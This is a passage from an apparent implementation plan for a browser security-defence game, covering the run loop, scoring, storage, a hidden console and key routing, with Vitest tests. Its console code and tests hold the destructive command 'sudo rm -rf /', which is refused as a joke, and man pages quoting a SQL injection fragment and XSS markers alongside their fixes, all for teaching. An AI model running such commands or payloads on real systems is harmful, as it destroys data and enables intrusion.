    const ev: RunEvent[] = [];
    if (this.state.phase === 'playing') fn(ev);
    return ev;
  }

  moveLane(d: 1 | -1): RunEvent[] { return this.act((ev) => setLane(this.state, this.state.knight.lane + d, ev)); }
  setLane(l: number): RunEvent[] { return this.act((ev) => setLane(this.state, l, ev)); }
  cycleTarget(dir: 1 | -1): RunEvent[] { return this.act((ev) => cycleTarget(this.state, dir, ev)); }
  target(id: number | null): RunEvent[] { return this.act((ev) => target(this.state, id, ev)); }
  throwSpear(): RunEvent[] { return this.act((ev) => throwSpear(this.state, ev)); }

  setHints(on: boolean): void {
    this.state.hints = on;
  }

  private clearWave(ev: RunEvent[]): void {
    const s = this.state;
    untarget(s, ev);
    s.stats.wavesCleared++;
    ev.push({ type: 'waveCleared', wave: s.wave });
    if (s.cfg.mode === 'campaign' && s.wave >= CAMPAIGN.length) { endRun(s, 'won', ev); return; }
    if (s.cfg.mode === 'overtime') s.score += Math.round(POINTS.overtimeWave * multiplier(s));
    s.phase = 'draft';
    s.draft = { picks: deal(this.rng, s.owned, [], s.drafts === 0 ? ['destrier', 'obs1'] : []), free: true, taken: [] };
    s.drafts++;
    ev.push({ type: 'draftOpened', draft: s.draft });
  }

  pick(index: number): RunEvent[] {
    const s = this.state, d = s.draft, ev: RunEvent[] = [];
    if (s.phase !== 'draft' || !d) return ev;
    const c = d.picks[index];
    if (!c || d.taken.includes(c.id)) return ev;
    if (d.free) d.free = false;
    else {
      const price = PRICE[c.rarity];
      if (s.credits < price) return ev;
      s.credits -= price;
    }
    d.taken.push(c.id);
    if (c.id === 'backup') {
      const before = s.uptime;
      s.uptime = Math.min(100, s.uptime + 30);
      ev.push({ type: 'uptime', before, after: s.uptime });
    } else {
      s.owned.push(c.id);
      ev.push({ type: 'owned', owned: [...s.owned] });
    }
    ev.push({ type: 'draftChanged', draft: d });
    return ev;
  }

  reroll(): RunEvent[] {
    const s = this.state, d = s.draft;
    if (s.phase !== 'draft' || !d || s.credits < REROLL_COST) return [];
    s.credits -= REROLL_COST;
    d.picks = deal(this.rng, s.owned, d.taken);
    return [{ type: 'draftChanged', draft: d }];
  }

  nextWave(): RunEvent[] {
    const s = this.state;
    if (s.phase !== 'draft') return [];
    s.wave++;
    s.timeLeft = this.waveDef.secs;
    s.spawnT = 0.4;
    s.draft = null;
    s.phase = 'playing';
    return this.start();
  }

  cheat(kind: 'god' | 'credits' | 'skip', amount = 1000): RunEvent[] {
    const s = this.state, ev: RunEvent[] = [];
    s.tampered = true;
    if (kind === 'god') s.god = true;
    if (kind === 'credits') s.credits += Math.max(0, Math.floor(amount));
    if (kind === 'skip' && s.phase === 'playing') {
      untarget(s, ev);
      s.packets = []; s.pending = []; s.spears = [];
      s.timeLeft = 0;
      this.clearWave(ev);
    }
    return ev;
  }
}
```

Run: `npx vitest run src/core && npx vitest run --coverage` → PASS, and the coverage gate (80% on `src/core`) passes.

- [ ] **Step 3: Commit**

```bash
git add src/core/run.ts src/core/run.test.ts
git commit -m "Add the Run that drives waves, drafts and cheats" -m "One class composes the core: a fixed step order, the wave clock, the rogue-lite draft with its free first pick, Overtime's bonus and the cheats that mark a run as tampered." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 9: Results, grades, share text and guarded storage

**Files:**
- Create: `src/core/score.ts`, `src/storage.ts`
- Test: `src/core/score.test.ts`, `src/storage.test.ts`

**Interfaces:**
- Consumes: `RunState`, `Stats`, `breachTotal` (Task 5), `Lang` (Task 2), `Mode` (Task 3).
- Produces:
  - `score.ts`: `type Grade = 'S' | 'A' | 'B' | 'C' | 'D' | 'F'`; `interface RunResult { mode; root; tampered; won; reason: EndReason; score; wave; wavesCleared; uptime; rep; stats: Stats }`; `resultOf(s: RunState): RunResult`; `grade(r): Grade | null` (null in Overtime); `shareText(r, lang): string`; `SHARE_URL = 'jorius.github.io/none-shall-pass'`.
  - `storage.ts`: `interface Bests { campaign: Partial<Record<'normal' | 'root', { score: number; grade: Grade }>>; overtime: Partial<Record<'normal' | 'root', { wave: number; score: number }>>; won: boolean }`; `interface Prefs { lang?: Lang; hints?: boolean; reducedFx?: boolean }`; `createStore(backend?: Storage | null)` returning `{ bests(): Bests; recordResult(r: RunResult): { newBest: boolean }; prefs(): Prefs; setPrefs(p: Partial<Prefs>): void }`. Backend `null` or a throwing backend degrades to in-memory.

- [ ] **Step 1: Write the failing tests**

`src/core/score.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { grade, resultOf, shareText, type RunResult } from './score';
import { freshState } from './testkit';

const base = (over: Partial<RunResult> = {}): RunResult => {
  const s = freshState();
  s.phase = 'ended'; s.endReason = 'won'; s.score = 18420; s.wave = 6;
  return { ...resultOf(s), ...over };
};

describe('grade', () => {
  it('grades the campaign by outcome, uptime and mistakes', () => {
    expect(grade(base({ uptime: 95 }))).toBe('S');
    const twoBreaches = base({ uptime: 95 });
    twoBreaches.stats = { ...twoBreaches.stats, breaches: { ...twoBreaches.stats.breaches, sqli: 2 } };
    expect(grade(twoBreaches)).toBe('A');
    const fps = base({ uptime: 80 }); fps.stats = { ...fps.stats, falsePositives: 3 };
    expect(grade(fps)).toBe('B');
    expect(grade(base({ uptime: 60 }))).toBe('B');
    expect(grade(base({ uptime: 30 }))).toBe('C');
    expect(grade(base({ uptime: 10 }))).toBe('D');
    expect(grade(base({ won: false, reason: 'serverDown', uptime: 0 }))).toBe('F');
    expect(grade(base({ won: false, reason: 'usersGone' }))).toBe('F');
  });
  it('has no grade in overtime', () => {
    expect(grade(base({ mode: 'overtime' }))).toBeNull();
  });
});

describe('shareText', () => {
  it('formats the campaign line in English and Spanish', () => {
    const r = base({ uptime: 80 });
    r.stats = { ...r.stats, falsePositives: 1, breaches: { ...r.stats.breaches, xss: 2 } };
    expect(shareText(r, 'en')).toBe('⚔ NONE SHALL PASS — Grade A · 18,420 pts · 2 breaches · 1 angry user\njorius.github.io/none-shall-pass');
    expect(shareText(r, 'es')).toBe('⚔ NONE SHALL PASS — Nota A · 18.420 pts · 2 brechas · 1 usuario molesto\njorius.github.io/none-shall-pass');
  });
  it('marks root and tampered runs and formats overtime', () => {
    const r = base({ mode: 'overtime', wave: 7, wavesCleared: 6, root: true, tampered: true, score: 31200 });
    expect(shareText(r, 'en')).toBe('⚔ NONE SHALL PASS · OVERTIME — wave 7 · 31,200 pts · ROOT · TAMPERED\njorius.github.io/none-shall-pass');
  });
});

describe('resultOf', () => {
  it('copies what the debrief needs', () => {
    const s = freshState({ root: true });
    s.phase = 'ended'; s.endReason = 'serverDown'; s.uptime = 0; s.wave = 3; s.tampered = true;
    const r = resultOf(s);
    expect(r).toMatchObject({ mode: 'campaign', root: true, tampered: true, won: false, reason: 'serverDown', wave: 3, uptime: 0 });
  });
});
```

`src/storage.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// local
import type { RunResult } from './core/score';
import { createStore } from './storage';

const memory = (): Storage => {
  const m = new Map<string, string>();
  return {
    get length() { return m.size; },
    clear: () => m.clear(),
    getItem: (k) => m.get(k) ?? null,
    key: (i) => [...m.keys()][i] ?? null,
    removeItem: (k) => { m.delete(k); },
    setItem: (k, v) => { m.set(k, String(v)); },
  };
};

const throwing: Storage = {
  length: 0, clear() { throw new Error('blocked'); }, getItem() { throw new Error('blocked'); }, key() { return null; },
  removeItem() { throw new Error('blocked'); }, setItem() { throw new Error('QuotaExceeded'); },
};

const result = (over: Partial<RunResult>): RunResult => ({
  mode: 'campaign', root: false, tampered: false, won: true, reason: 'won', score: 1000, wave: 6, wavesCleared: 6, uptime: 90, rep: 10,
  stats: { hits: { 1: 0, 2: 0, 3: 0 }, squireHits: 0, ruleBlocks: 0, served: 0, decoysKept: 0, neutralized: 0, falsePositives: 0, breaches: { sqli: 0, xss: 0, brute: 0, scan: 0, flood: 0 }, wavesCleared: 6 },
  ...over,
});

describe('store', () => {
  it('records campaign bests per mode and marks the campaign as won', () => {
    const st = createStore(memory());
    expect(st.recordResult(result({ score: 1000 })).newBest).toBe(true);
    expect(st.recordResult(result({ score: 500 })).newBest).toBe(false);
    expect(st.recordResult(result({ score: 2000, root: true })).newBest).toBe(true);
    const b = st.bests();
    expect(b.campaign.normal?.score).toBe(1000);
    expect(b.campaign.root?.score).toBe(2000);
    expect(b.won).toBe(true);
  });

  it('records overtime by wave, then score', () => {
    const st = createStore(memory());
    st.recordResult(result({ mode: 'overtime', wave: 4, score: 9000, won: false, reason: 'serverDown' }));
    expect(st.recordResult(result({ mode: 'overtime', wave: 5, score: 100, won: false, reason: 'serverDown' })).newBest).toBe(true);
    expect(st.bests().overtime.normal).toEqual({ wave: 5, score: 100 });
  });

  it('never saves tampered runs', () => {
    const st = createStore(memory());
    expect(st.recordResult(result({ tampered: true, score: 99999 })).newBest).toBe(false);
    expect(st.bests().campaign.normal).toBeUndefined();
    expect(st.bests().won).toBe(false);
  });

  it('survives a blocked backend and garbage data', () => {
    const st = createStore(throwing);
    expect(st.recordResult(result({})).newBest).toBe(true);
    expect(st.bests().campaign.normal?.score).toBe(1000);
    st.setPrefs({ lang: 'es' });
    expect(st.prefs().lang).toBe('es');
    const m = memory();
    m.setItem('nsp.v1', '{not json');
    expect(createStore(m).bests()).toEqual({ campaign: {}, overtime: {}, won: false });
    expect(createStore(null).prefs()).toEqual({});
  });

  it('persists prefs across instances', () => {
    const m = memory();
    createStore(m).setPrefs({ hints: true, lang: 'en' });
    expect(createStore(m).prefs()).toEqual({ hints: true, lang: 'en' });
  });
});
```

Run: `npx vitest run src/core/score.test.ts src/storage.test.ts` → FAIL.

- [ ] **Step 2: Implement `src/core/score.ts`**

```ts
// core
import type { Mode } from './content/waves';
import { breachTotal, type EndReason, type RunState, type Stats } from './state';
import type { Lang } from './types';

export type Grade = 'S' | 'A' | 'B' | 'C' | 'D' | 'F';

export interface RunResult {
  mode: Mode;
  root: boolean;
  tampered: boolean;
  won: boolean;
  reason: EndReason;
  score: number;
  wave: number;
  wavesCleared: number;
  uptime: number;
  rep: number;
  stats: Stats;
}

export const SHARE_URL = 'jorius.github.io/none-shall-pass';

export const resultOf = (s: RunState): RunResult => ({
  mode: s.cfg.mode,
  root: s.cfg.root,
  tampered: s.tampered,
  won: s.endReason === 'won',
  reason: s.endReason ?? 'serverDown',
  score: s.score,
  wave: s.wave,
  wavesCleared: s.stats.wavesCleared,
  uptime: s.uptime,
  rep: s.rep,
  stats: s.stats,
});

export const grade = (r: RunResult): Grade | null => {
  if (r.mode === 'overtime') return null;
  if (!r.won) return 'F';
  const fp = r.stats.falsePositives, br = breachTotal(r.stats);
  if (r.uptime >= 90 && fp === 0 && br <= 1) return 'S';
  if (r.uptime >= 75 && fp <= 2) return 'A';
  if (r.uptime >= 50) return 'B';
  if (r.uptime >= 25) return 'C';
  return 'D';
};

const fmt = (n: number, lang: Lang): string => n.toLocaleString(lang === 'es' ? 'es-CO' : 'en-US');
const plural = (n: number, one: string, many: string): string => `${n} ${n === 1 ? one : many}`;

export const shareText = (r: RunResult, lang: Lang): string => {
  const tags = `${r.root ? ' · ROOT' : ''}${r.tampered ? ' · TAMPERED' : ''}`;
  if (r.mode === 'overtime') {
    const head = lang === 'es' ? `⚔ NONE SHALL PASS · TIEMPO EXTRA — oleada ${r.wave}` : `⚔ NONE SHALL PASS · OVERTIME — wave ${r.wave}`;
    return `${head} · ${fmt(r.score, lang)} pts${tags}\n${SHARE_URL}`;
  }
  const g = grade(r);
  const br = breachTotal(r.stats), fp = r.stats.falsePositives;
  const body = lang === 'es'
    ? `Nota ${g} · ${fmt(r.score, lang)} pts · ${plural(br, 'brecha', 'brechas')} · ${plural(fp, 'usuario molesto', 'usuarios molestos')}`
    : `Grade ${g} · ${fmt(r.score, lang)} pts · ${plural(br, 'breach', 'breaches')} · ${plural(fp, 'angry user', 'angry users')}`;
  return `⚔ NONE SHALL PASS — ${body}${tags}\n${SHARE_URL}`;
};
```

Note: `es-CO` groups thousands with a dot (`18.420`). If the test runner's ICU prints a different separator, keep the test expectation and format Spanish numbers manually with `n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.')`.

- [ ] **Step 3: Implement `src/storage.ts`**

```ts
// core
import { grade as gradeOf, type Grade, type RunResult } from './core/score';
import type { Lang } from './core/types';

export interface Bests {
  campaign: Partial<Record<'normal' | 'root', { score: number; grade: Grade }>>;
  overtime: Partial<Record<'normal' | 'root', { wave: number; score: number }>>;
  won: boolean;
}
export interface Prefs { lang?: Lang; hints?: boolean; reducedFx?: boolean }
interface Saved { bests: Bests; prefs: Prefs }

const KEY = 'nsp.v1';
const empty = (): Saved => ({ bests: { campaign: {}, overtime: {}, won: false }, prefs: {} });

const parse = (raw: string | null): Saved => {
  if (!raw) return empty();
  try {
    const v = JSON.parse(raw) as Partial<Saved>;
    const e = empty();
    return {
      bests: { campaign: { ...v.bests?.campaign }, overtime: { ...v.bests?.overtime }, won: v.bests?.won === true },
      prefs: { ...e.prefs, ...v.prefs },
    };
  } catch {
    return empty();
  }
};

// localStorage can be missing, blocked, full or hold garbage; the game must play anyway.
export const createStore = (backend: Storage | null = typeof localStorage === 'undefined' ? null : localStorage) => {
  let data: Saved;
  try { data = parse(backend?.getItem(KEY) ?? null); } catch { data = empty(); }
  const save = (): void => { try { backend?.setItem(KEY, JSON.stringify(data)); } catch { /* keep in memory */ } };

  return {
    bests: (): Bests => data.bests,
    prefs: (): Prefs => ({ ...data.prefs }),
    setPrefs(p: Partial<Prefs>): void { data.prefs = { ...data.prefs, ...p }; save(); },
    recordResult(r: RunResult): { newBest: boolean } {
      if (r.tampered) return { newBest: false };
      const slot = r.root ? 'root' : 'normal';
      let newBest = false;
      if (r.mode === 'campaign') {
        if (r.won) data.bests.won = true;
        const prev = data.bests.campaign[slot];
        if (!prev || r.score > prev.score) {
          data.bests.campaign[slot] = { score: r.score, grade: gradeOf(r) ?? 'F' };
          newBest = true;
        }
      } else {
        const prev = data.bests.overtime[slot];
        if (!prev || r.wave > prev.wave || (r.wave === prev.wave && r.score > prev.score)) {
          data.bests.overtime[slot] = { wave: r.wave, score: r.score };
          newBest = true;
        }
      }
      save();
      return { newBest };
    },
  };
};

export type Store = ReturnType<typeof createStore>;
```

Run: `npx vitest run` → PASS.

- [ ] **Step 4: Commit**

```bash
git add src/core/score.ts src/core/score.test.ts src/storage.ts src/storage.test.ts
git commit -m "Add grades, share text and guarded best-score storage" -m "The debrief and the copy-to-share line come from one result object; storage degrades to memory when the browser blocks or corrupts it, and tampered runs never count." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 10: The hidden console and key routing

**Files:**
- Create: `src/core/console.ts`, `src/core/keys.ts`
- Test: `src/core/console.test.ts`, `src/core/keys.test.ts`

**Interfaces:**
- Consumes: `Lang` (Task 2), `CardId` (Task 3).
- Produces:
  - `console.ts`: `type ConsoleEffect = { kind: 'clear' } | { kind: 'exit' } | { kind: 'glitch' } | { kind: 'god' } | { kind: 'skip' } | { kind: 'credits'; amount: number }`; `interface ConsoleReply { lines: string[]; effect?: ConsoleEffect }`; `runCommand(input: string, ctx: { lang: Lang; owned: readonly CardId[] }): ConsoleReply`; `isCheat(effect?: ConsoleEffect): boolean`.
  - `keys.ts`: `type Screen = 'title' | 'howto' | 'playing' | 'paused' | 'draft' | 'console' | 'debrief'`; `type Action = 'laneUp' | 'laneDown' | 'next' | 'prev' | 'throw' | 'release' | 'hints' | 'pause' | 'console' | 'closeConsole' | null`; `routeKey(k: { key: string; shiftKey: boolean; inField: boolean }, screen: Screen): Action`; `KONAMI`; `konamiMatcher(): (key: string) => boolean`.

- [ ] **Step 1: Write the failing tests**

`src/core/console.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { isCheat, runCommand } from './console';

const en = { lang: 'en' as const, owned: ['lockdown'] as const };
const es = { lang: 'es' as const, owned: [] as const };

describe('runCommand', () => {
  it('lists commands without the cheats', () => {
    const r = runCommand('help', en);
    expect(r.lines.join('\n')).toContain('man <attack>');
    expect(r.lines.join('\n')).not.toMatch(/\bgod\b|credits|skip/);
  });

  it('answers whoami and man pages in both languages', () => {
    expect(runCommand('whoami', en).lines[0]).toContain('Black Knight');
    expect(runCommand('whoami', es).lines[0]).toContain('Caballero Negro');
    expect(runCommand('man sqli', en).lines.join(' ')).toContain('prepared statements');
    expect(runCommand('man xss', es).lines.join(' ')).toContain('Content-Security-Policy');
    expect(runCommand('man', en).lines[0]).toContain('man sqli');
    expect(runCommand('man nothing', en).lines[0]).toContain('man sqli');
  });

  it('reflects port lockdown in nmap', () => {
    expect(runCommand('nmap shop.example', en).lines.join('\n')).toMatch(/23\/tcp\s+filtered/);
    expect(runCommand('nmap shop.example', es).lines.join('\n')).toMatch(/23\/tcp\s+open/);
  });

  it('jokes about dropping everything and refuses sudo', () => {
    expect(runCommand('iptables -P INPUT DROP', en).lines[0]).toContain('zero users');
    expect(runCommand('sudo make me a sandwich', en).lines[0]).toBe('Nice try.');
    expect(runCommand('sudo rm -rf /', en)).toEqual({ lines: ['No.'], effect: { kind: 'glitch' } });
    expect(runCommand('sudo rm -rf --no-preserve-root /', es).effect).toEqual({ kind: 'glitch' });
  });

  it('runs cheats and says the run is tampered', () => {
    expect(runCommand('god', en).effect).toEqual({ kind: 'god' });
    expect(runCommand('credits 500', en)).toMatchObject({ effect: { kind: 'credits', amount: 500 } });
    expect(runCommand('credits', en).effect).toEqual({ kind: 'credits', amount: 1000 });
    expect(runCommand('credits -5', en).effect).toEqual({ kind: 'credits', amount: 1 });
    expect(runCommand('skip', es).lines[0]).toContain('TAMPERED');
    expect(isCheat({ kind: 'god' })).toBe(true);
    expect(isCheat({ kind: 'clear' })).toBe(false);
    expect(isCheat(undefined)).toBe(false);
  });

  it('handles clear, exit, blanks and unknowns', () => {
    expect(runCommand('clear', en)).toEqual({ lines: [], effect: { kind: 'clear' } });
    expect(runCommand('exit', en).effect).toEqual({ kind: 'exit' });
    expect(runCommand('   ', en)).toEqual({ lines: [] });
    expect(runCommand('hack the planet', en).lines[0]).toBe('hack: command not found. Try help.');
    expect(runCommand('hack', es).lines[0]).toBe('hack: comando no encontrado. Prueba help.');
  });
});
```

`src/core/keys.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { konamiMatcher, KONAMI, routeKey } from './keys';

const k = (key: string, over: { shiftKey?: boolean; inField?: boolean } = {}) => ({ key, shiftKey: false, inField: false, ...over });

describe('routeKey', () => {
  it('maps play keys', () => {
    expect(routeKey(k('ArrowUp'), 'playing')).toBe('laneUp');
    expect(routeKey(k('ArrowDown'), 'playing')).toBe('laneDown');
    expect(routeKey(k('Tab'), 'playing')).toBe('next');
    expect(routeKey(k('Tab', { shiftKey: true }), 'playing')).toBe('prev');
    expect(routeKey(k(' '), 'playing')).toBe('throw');
    expect(routeKey(k('Escape'), 'playing')).toBe('release');
    expect(routeKey(k('H'), 'playing')).toBe('hints');
    expect(routeKey(k('p'), 'playing')).toBe('pause');
    expect(routeKey(k('`'), 'playing')).toBe('console');
  });

  it('keeps the game deaf while the console is open or an input has focus', () => {
    for (const key of ['h', 'p', ' ', 'ArrowUp', 'Tab', 'a']) expect(routeKey(k(key), 'console')).toBeNull();
    expect(routeKey(k('Escape'), 'console')).toBe('closeConsole');
    expect(routeKey(k('`'), 'console')).toBe('closeConsole');
    expect(routeKey(k('h', { inField: true }), 'playing')).toBeNull();
  });

  it('only unpauses while paused and ignores play keys elsewhere', () => {
    expect(routeKey(k('p'), 'paused')).toBe('pause');
    expect(routeKey(k('Escape'), 'paused')).toBe('pause');
    expect(routeKey(k(' '), 'paused')).toBeNull();
    expect(routeKey(k('`'), 'paused')).toBe('console');
    expect(routeKey(k(' '), 'draft')).toBeNull();
    expect(routeKey(k('`'), 'title')).toBeNull();
  });
});

describe('konamiMatcher', () => {
  it('fires on the full code, tolerating extra ups and capital letters', () => {
    const m = konamiMatcher();
    const seq = ['ArrowUp', ...KONAMI.slice(0, 8), 'B', 'A'];
    const fired = seq.map((key) => m(key));
    expect(fired.at(-1)).toBe(true);
    expect(fired.slice(0, -1).every((f) => !f)).toBe(true);
  });
  it('does not fire on a broken code', () => {
    const m = konamiMatcher();
    expect(['ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'].some((key) => m(key))).toBe(false);
  });
});
```

Run: `npx vitest run src/core/console.test.ts src/core/keys.test.ts` → FAIL.

- [ ] **Step 2: Implement `src/core/console.ts`**

```ts
// core
import type { CardId } from './content/cards';
import type { Lang } from './types';

export type ConsoleEffect = { kind: 'clear' } | { kind: 'exit' } | { kind: 'glitch' } | { kind: 'god' } | { kind: 'skip' } | { kind: 'credits'; amount: number };
export interface ConsoleReply { lines: string[]; effect?: ConsoleEffect }

const T = <A extends string[]>(en: A, es: A) => ({ en, es });

const HELP = T(
  ['commands:', '  help                 this list', '  whoami               who you are', '  man <attack>         sqli · xss · brute · scan · flood', '  nmap shop.example    what answers from outside', '  clear · exit'],
  ['comandos:', '  help                 esta lista', '  whoami               quién eres', '  man <ataque>         sqli · xss · brute · scan · flood', '  nmap shop.example    qué responde desde afuera', '  clear · exit'],
);

const MAN: Record<string, { en: string[]; es: string[] }> = {
  sqli: T(
    ['SQLI(7)  SQL injection', "Input spliced into a query becomes part of it: ' OR 1=1-- matches every row.", 'Fix: prepared statements; allow-list identifiers such as sort columns.'],
    ['SQLI(7)  inyección SQL', "La entrada pegada en una consulta se vuelve parte de ella: ' OR 1=1-- coincide con todas las filas.", 'Solución: sentencias preparadas; listas permitidas para identificadores como columnas de orden.'],
  ),
  xss: T(
    ['XSS(7)  cross-site scripting', "Markup from users runs as code in other users' browsers: <script>, onerror=, javascript: links.", 'Fix: encode on output; add a Content-Security-Policy.'],
    ['XSS(7)  cross-site scripting', 'El marcado de usuarios se ejecuta como código en los navegadores de otros: <script>, onerror=, enlaces javascript:.', 'Solución: codifica al mostrar; agrega una Content-Security-Policy.'],
  ),
  brute: T(
    ['BRUTE(7)  password guessing, spraying, stuffing', 'Lists of common or leaked passwords, tried until one works.', 'Fix: MFA, SSH keys, rate limits, fail2ban.'],
    ['BRUTE(7)  adivinanza, spraying, stuffing', 'Listas de contraseñas comunes o filtradas, probadas hasta que una funciona.', 'Solución: MFA, llaves SSH, límites de intentos, fail2ban.'],
  ),
  scan: T(
    ['SCAN(7)  port scanning', 'SYN probes map which services answer before the real attack.', "Fix: close what you don't use; default-deny."],
    ['SCAN(7)  escaneo de puertos', 'Sondas SYN mapean qué servicios responden antes del ataque real.', 'Solución: cierra lo que no usas; denegar por defecto.'],
  ),
  flood: T(
    ['FLOOD(7)  denial of service', 'Thousands of harmless-looking requests; the volume is the attack.', 'Fix: a CDN, rate limits, caching.'],
    ['FLOOD(7)  denegación de servicio', 'Miles de peticiones de aspecto inofensivo; el volumen es el ataque.', 'Solución: una CDN, límites de peticiones, caché.'],
  ),
};

const MAN_HINT = { en: 'What manual page do you want? Try: man sqli', es: '¿Qué página del manual quieres? Prueba: man sqli' };
const TAMPERED = { en: 'This run is now marked TAMPERED.', es: 'Esta partida queda marcada como TAMPERED.' };

const nmap = (lang: Lang, owned: readonly CardId[]): string[] => {
  const locked = owned.includes('lockdown');
  const row = (port: string, svc: string, open: boolean) => `${port.padEnd(9)}${(open ? 'open' : 'filtered').padEnd(10)}${svc}`;
  return [
    lang === 'es' ? 'Iniciando Nmap ( https://nmap.org )' : 'Starting Nmap ( https://nmap.org )',
    'PORT     STATE     SERVICE',
    row('22/tcp', 'ssh', true),
    row('23/tcp', 'telnet', !locked),
    row('25/tcp', 'smtp', true),
    row('443/tcp', 'https', true),
    row('445/tcp', 'microsoft-ds', !locked),
    row('3389/tcp', 'ms-wbt-server', !locked),
    lang === 'es' ? 'Nmap terminado: 1 dirección IP (1 host activo)' : 'Nmap done: 1 IP address (1 host up)',
  ];
};

export const isCheat = (e?: ConsoleEffect): boolean => !!e && (e.kind === 'god' || e.kind === 'skip' || e.kind === 'credits');

export const runCommand = (input: string, ctx: { lang: Lang; owned: readonly CardId[] }): ConsoleReply => {
  const { lang } = ctx;
  const line = input.trim().replace(/\s+/g, ' ');
  if (!line) return { lines: [] };
  const [cmd, ...args] = line.split(' ');
  const c = cmd.toLowerCase();
  switch (c) {
    case 'help': return { lines: HELP[lang] };
    case 'whoami': return { lines: [lang === 'es' ? 'el Caballero Negro. Brazos: los dos, por ahora.' : 'the Black Knight. Arms: both, for now.'] };
    case 'man': {
      const page = MAN[(args[0] ?? '').toLowerCase()];
      return { lines: page ? page[lang] : [MAN_HINT[lang]] };
    }
    case 'nmap': return { lines: nmap(lang, ctx.owned) };
    case 'iptables':
      if (line === 'iptables -P INPUT DROP') {
        return { lines: [lang === 'es' ? 'Listo. Tu servidor está perfectamente seguro y tiene cero usuarios.' : 'Done. Your server is perfectly secure and has zero users.'] };
      }
      break;
    case 'sudo':
      if (/^sudo rm -rf( --no-preserve-root)? \/$/.test(line)) return { lines: ['No.'], effect: { kind: 'glitch' } };
      return { lines: [lang === 'es' ? 'Buen intento.' : 'Nice try.'] };
    case 'clear': return { lines: [], effect: { kind: 'clear' } };
    case 'exit': case 'quit': return { lines: [], effect: { kind: 'exit' } };
    case 'god': return { lines: [`${lang === 'es' ? 'Modo dios activado.' : 'God mode on.'} ${TAMPERED[lang]}`], effect: { kind: 'god' } };
    case 'skip': return { lines: [`${lang === 'es' ? 'Oleada saltada.' : 'Wave skipped.'} ${TAMPERED[lang]}`], effect: { kind: 'skip' } };
    case 'credits': {
      const n = args.length ? Math.min(1_000_000, Math.max(1, Math.floor(Number(args[0]) || 1))) : 1000;
      return { lines: [`+${n} ${lang === 'es' ? 'créditos.' : 'credits.'} ${TAMPERED[lang]}`], effect: { kind: 'credits', amount: n } };
    }
  }
  return { lines: [lang === 'es' ? `${cmd}: comando no encontrado. Prueba help.` : `${cmd}: command not found. Try help.`] };
};
```

- [ ] **Step 3: Implement `src/core/keys.ts`**

```ts
export type Screen = 'title' | 'howto' | 'playing' | 'paused' | 'draft' | 'console' | 'debrief';
export type Action = 'laneUp' | 'laneDown' | 'next' | 'prev' | 'throw' | 'release' | 'hints' | 'pause' | 'console' | 'closeConsole' | null;

export const routeKey = (k: { key: string; shiftKey: boolean; inField: boolean }, screen: Screen): Action => {
  if (screen === 'console') return k.key === 'Escape' || k.key === '`' ? 'closeConsole' : null;
  if (k.inField) return null;
  if (k.key === '`') return screen === 'playing' || screen === 'paused' ? 'console' : null;
  if (screen === 'paused') return k.key === 'p' || k.key === 'P' || k.key === 'Escape' ? 'pause' : null;
  if (screen !== 'playing') return null;
  switch (k.key) {
    case 'ArrowUp': return 'laneUp';
    case 'ArrowDown': return 'laneDown';
    case 'Tab': return k.shiftKey ? 'prev' : 'next';
    case ' ': return 'throw';
    case 'Escape': return 'release';
    case 'h': case 'H': return 'hints';
    case 'p': case 'P': return 'pause';
    default: return null;
  }
};

export const KONAMI = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'] as const;

// A sliding window of the last ten keys, so extra presses before the code still match.
export const konamiMatcher = (): ((key: string) => boolean) => {
  const buf: string[] = [];
  return (key: string) => {
    buf.push(key.length === 1 ? key.toLowerCase() : key);
    if (buf.length > KONAMI.length) buf.shift();
    const hit = buf.length === KONAMI.length && buf.every((k, i) => k === KONAMI[i]);
    if (hit) buf.length = 0;
    return hit;
  };
};
```

Run: `npx vitest run` → PASS.

- [ ] **Step 4: Commit**

```bash
git add src/core/console.ts src/core/keys.ts src/core/console.test.ts src/core/keys.test.ts
git commit -m "Add the hidden console commands and key routing" -m "The console's replies and the keyboard map are pure functions, so typing in the console can never throw a spear and the Konami code survives a stray key." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 11: Interface strings in English and Spanish

**Files:**
- Create: `src/i18n/en.json`, `src/i18n/es.json`, `src/i18n/index.ts`
- Test: `src/i18n/i18n.test.ts`

**Interfaces:**
- Consumes: `Lang`, `Localized` (Task 2).
- Produces: `t(key: string, vars?: Record<string, string | number>): string`; `loc(x: Localized): string`; `lang(): Lang`; `setLang(l: Lang): void`; `onLang(fn: (l: Lang) => void): () => void`; `detectLang(nav?: string): Lang`; `fmtNum(n: number): string` (locale grouping). Every UI task uses only keys defined here; the "used keys exist" test fails the build if a task invents a key without adding it to both files.

- [ ] **Step 1: Write the failing test**

`src/i18n/i18n.test.ts`:
```ts
// packages
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

// local
import en from './en.json';
import es from './es.json';
import { detectLang, fmtNum, loc, setLang, t } from './index';

const flatten = (o: object, prefix = ''): Record<string, string> =>
  Object.entries(o).reduce<Record<string, string>>((acc, [k, v]) => {
    const key = prefix ? `${prefix}.${k}` : k;
    if (typeof v === 'string') acc[key] = v; else Object.assign(acc, flatten(v as object, key));
    return acc;
  }, {});

const files = (dir: string): string[] => readdirSync(dir).flatMap((f) => {
  const p = join(dir, f);
  return statSync(p).isDirectory() ? files(p) : p.endsWith('.ts') && !p.endsWith('.test.ts') ? [p] : [];
});

afterEach(() => setLang('en'));

describe('locales', () => {
  it('have the same keys and placeholders', () => {
    const a = flatten(en), b = flatten(es);
    expect(Object.keys(b).sort()).toEqual(Object.keys(a).sort());
    for (const k of Object.keys(a)) {
      const ph = (s: string) => (s.match(/\{\w+\}/g) ?? []).sort();
      expect(ph(b[k]), k).toEqual(ph(a[k]));
    }
  });

  it('define every key the code asks for', () => {
    const keys = flatten(en);
    for (const f of files(join(import.meta.dirname, '..'))) {
